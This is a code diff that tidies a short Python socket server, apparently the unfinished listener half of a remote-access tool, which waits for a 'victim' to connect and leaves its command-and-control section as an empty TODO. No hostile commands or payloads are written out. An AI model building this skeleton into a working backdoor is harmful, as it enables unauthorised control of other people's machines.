@@ -1,21 +1,24 @@
 import os
 import socket
 
-#Making A connection
+# Create the socket
 s = socket.socket()
+
+# store info in variables to use later
 host = socket.gethostname()
 port = 8080
-s.bind(((host, port))
-print("")
-print(" Server Is Running ", host)
-print("")
-print("Waiting For The Vitctim's Connection")
+
+# Bind socket to address
+s.bind(tuple((host, port)))
+print("\nServer Is Running ", host, "\n", "Waiting For The Vitctim's Connection")
+
+# listener
 s.listen(1)
 conn, addr = s.accept()
-print("")
-print(addr, "Connection To Victim Is Successful : ")
+print("\n", addr, "Connection To Victim Is Successful : ")
 
+""" TODO
 #Command Control
 
 #Taking Actions
-
+"""
